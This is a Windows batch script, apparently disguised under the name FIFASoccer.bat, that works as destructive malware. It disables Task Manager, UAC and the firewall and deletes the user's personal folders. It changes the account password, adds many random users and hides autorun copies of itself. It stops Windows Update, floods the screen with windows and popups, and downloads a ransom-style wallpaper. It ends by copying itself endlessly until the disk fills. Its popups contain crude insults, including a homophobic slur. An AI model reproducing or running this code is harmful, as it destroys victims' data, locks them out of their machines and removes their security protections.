@echo off
cls

:: Sets Vars

set A1=%tmp%\~404.vbs
set A2=%tmp%\~4042.vbs
set A3=%tmp%\~4043.vbs
set A4=%tmp%\~4044.vbs
set A5=%tmp%\~4045.vbs
set A6=%tmp%\~4046.vbs
set A7=%tmp%\~4047.vbs
set A8=%tmp%\~4047.vbs
set A9=%tmp%\~507.vbs

:: Adds Keys to registry to disable Task Manager and UAC
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /f /d 1
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f


:: Starts fake error Message
echo.X=MsgBox("DLL is missing.",0+16,"Error") >> %A1%
start %A1%

timeout 5 >NUL

:: Deletes every single file on the system
del "%userprofile%\Downloads" /f /s /q
del "%userprofile%\Documents" /f /s /q
del "%userprofile%\Music" /f /s /q
del "%userprofile%\Videos" /f /s /q
del "%userprofile%\Pictures" /f /s /q

:: CD-Rom Payload
echo Set oWMP=CreateObject("WMplayer.OCX.7")>>123.vbs
echo Set colCDROMs=oWMP.cdromCollection>>123.vbs
echo do>>123.vbs
echo if colCDROMs.count>=1 then>>123.vbs
echo for i=0 to colCDROMs.Count -1>>123.vbs
echo colCDROMs.Item(i).Eject>>123.vbs
echo Next>>123.vbs
echo For i=0 to colCDROMs.Count -1>>123.vbs
echo colCDROMs.Item(i).Eject>>123.vbs
echo Next>>123.vbs
echo End If>>123.vbs
echo wscript.sleep 5000>>123.vbs
echo loop>>123.vbs

:: Creates a Batch File that pings Apple 50000 times.
echo @echo off>>n3o.bat
echo cls>>n3o.bat
echo title haxxed!!!!!!!!!!>>n3o.bat
echo echo You are a gay furry trans homosexual femboy>>n3o.bat
echo ping apple.com -t -l 50000>>n3o.bat
echo pause>>n3o.bat

:: Copies files to C drives and hides them
copy /y 123.vbs C:\
copy /y 1234.vbs C:\
copy /y n3o.bat C:\
attrib +s +h c:\123.vbs
attrib +s +h c:\n3o.bat

:: Adds Registry Keys to disable shutdown and restart buttons, Change the legal notice text and caption on Bootup, And adds the proccesses to Run on bootup
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoClose /t REG_DWORD /f /d 1
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticetext /f /d "ITS TIME TO KICK SOME ASS!!!"
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticecaption /f /d "HAXXED"
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 123.vbs /d c:\123.vbs
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v n3o.bat /d c:\n3o.bat

:: Hides files again
attrib +s +h c:\123.vbs
attrib +s +h c:\n3o.bat

:: Starts CD-ROM Payload
start C:\123.vbs

:: Changes User Password to "fucku"
net user %username% fucku

:: Disables Windows Firewall
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off

:: Sends a message
msg * Lets have some fun!

:: Random Keys Payload
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}') 

:: Spam Proccesses payload
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start explorer.exe
start calc

:: Creates the error messages
echo.X=MsgBox("Ohhhh shit!",0+16,"Windows is now slowing down time.") >> %A2%
echo.X=MsgBox("explorer.exe has been detected as Trojan.Win32.FuckerTractor, Do you even have the time to remove it?",0+16,"Alert!") >> %A3%
echo.X=MsgBox("Your C Drive got deleted, what a shame.",0+16,"Oh no!") >> %A4%
echo.X=MsgBox("THEEZ IEZ ME DOOM",0+16,"Mydoom") >> %A5%
echo.X=MsgBox("Trojan found in RAM named Trojan.Win32.Suscat, God how are you such a lazy ass?",0+16,"Alert!") >> %A6%
echo.X=MsgBox("Trojan found in Start Menu named Email-Worm.Win32.Susc4tFUCKED, Remove it now!",0+16,"Alert!") >> %A7%
echo.X=MsgBox("FUCK ME!!!!!!!!!!!!!!!",0+16,"Alert!") >> %A8%

:: Starts Adware
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/
start http://canyoublockit.com/extreme-test/

:: Starts the error messages
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%

:: Creates script
echo Set WshShell = WScript.CreateObject("WScript.Shell")` >> %A9%  
echo WshShell.AppActivate "notepad" >> %A9%
echo WshShell.SendKeys "{ENTER}" >> %A9%

:: Annoy Payload (Starts random programs and random searches)

explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
start http://www.youtube.com/watch?v=sP2q3vN9YPU
start control
start http://www.google.com/search?q=cade+malane
start mspaint.exe
start notepad.exe
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
start control
start notepad
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{A}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{S}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{S}')
start http://www.google.com/search?q=hwo+to+delete+system+32
start http://www.bing.com/search?q=download+bonzi+buddy+free+no+virus
start http://www.bing.com/search?q=mcafee
start http://search.yahoo.co.jp/search?p=suscat
timeout 5 >NUL
start http://www.wow.com/search?q=nuts+downloads&s_it=sb-home&iscqry=&fr=&fr2=sb-top-search
start http://www.google.ca/search?q=memz+download
start notepad
start notepad
start explorer
start http://archive.org/compress/angry-birds-pc/formats=WINDOWS%20EXECUTABLE&file=/angry-birds-pc.zip
start http://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701tr.exe
start http://search.yahoo.co.jp/search?p=bfdi
timeout 7 >NUL
start http://google.nl
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{U}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{C}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{K}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{SPACE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{Y}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{O}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{U}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}')
start explorer
start explorer
start explorer
start explorer
start explorer
start explorer
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start appwiz.cpl
start sysdm.cpl
start sysdm.cpl
start regedit
start explorer
start mspaint
start netplwiz
start calc
start calc
start calc
start calc
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://media1.tenor.com/m/09V0d8pKCAEAAAAd/pasta-italian-nightmare.gif
start http://download.mozilla.org/?product=firefox-esr115-latest-ssl&os=win&lang=en-US
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}') 
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}') 
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}') 
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{S}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{U}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{C}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{C}')
timeout 8 >NUL

:: Copies itself to the windows directory (in exe version, this payload is different)
copy FIFASoccer.bat /y C:\Windows
attrib +s +h C:\Windows\FIFASoccer.bat
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v FIFASoccer.bat /d C:\Windows\FIFASoccer.bat
attrib +s +h C:\Windows\FIFASoccer.bat

:: Stops the windows update service

net stop wuauserv

:: Speech Payload (Creates an annoying speaking VBS File that loops itself)
echo.do>>succ.vbs
echo.CreateObject("sapi.spVoice").speak "Hahahahahahahahehehehahahahaeheheheheahahahehahehaheahehahehahhahahehaheehaehahehahaahahaheahahahaeaaaah">>succ.vbs
echo.loop>>succ.vbs
start succ.vbs

:: More Keys
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{B}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{A}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{L}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{L}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{S}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}')
powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')

:: Adds alot of Users
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add
net user %random% %random% /add

:: Spams Programs and error messages
start explorer
start explorer
start explorer
start explorer
start explorer
start explorer
start explorer
start explorer
start explorer
start
start
start
start
start calc
start calc
start services.msc
start devicemgmt.msc
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%
start %A2%
start %A3%
start %A4%
start %A5%
start %A6%
start %A7%
start %A8%

:: Sets Wallpaper (it can remove the wallpaper sometimes)
set IMG_URL=https://raw.githubusercontent.com/neo6942/neo-database/refs/heads/main/win/r4nsom.jpg
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"

:: Opens Magnifier and Inverts the colors
set append=00000001
set key=HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier
set value=Invert
set oldVal=0
for /F "skip=2 tokens=3" %%r in ('reg query %key% /v %value%') do set oldVal=%%r
echo previous=%oldVal%
set newVal=%oldVal%%append% 
reg add %key% /v %value% /d %newVal% /f /t REG_DWORD

:: Sends a message
msg * Will you be my Valentine?

:: FINAL PAYLOAD
:: Copies and Spreads itself everywhere in Windows and making random folders untill C drive is full

:final
copy FIFASoccer.bat /y C:\Windows\fifa%random%.exe
copy FIFASoccer.bat /y C:\Windows\System32\fifa%random%.exe
copy FIFASoccer.bat /y C:\Windows\System\fifa%random%.exe
copy FIFASoccer.bat /y C:\fifa%random%.exe
copy FIFASoccer.bat /y C:\Windows\Temp\fifa%random%.exe
copy FIFASoccer.bat /y C:\Windows\Prefetch\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\Downloads\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\Documents\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\Music\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\Pictures\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\Videos\fifa%random%.exe
copy FIFASoccer.bat /y %userprofile%\fifa%random%.exe
copy FIFASoccer.bat /y "C:\Program Files\fifa%random%.exe"
mkdir C:\Windows\%random%
mkdir C:\%random%
mkdir C:\Windows\System32\%random%
goto final








